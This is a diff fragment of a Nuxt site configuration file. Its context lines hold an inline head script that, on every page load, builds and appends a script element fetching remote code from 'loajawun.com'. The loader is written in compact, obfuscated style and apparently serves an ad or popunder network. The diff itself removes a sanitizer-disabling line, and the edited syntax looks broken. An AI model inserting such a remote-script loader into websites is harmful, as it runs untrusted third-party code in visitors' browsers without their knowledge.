@@ -48,8 +48,7 @@ export default defineNuxtConfig({
                     innerHTML: "(function(d,z,s){s.src='https://'+d+'/400/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('loajawun.com',7738058,document.createElement('script'))",
                     type: 'text/javascript'
                 }
-            ]
-                    __dangerouslyDisableSanitizers: ['script']
+                    ]
         }
     },
     // build modules
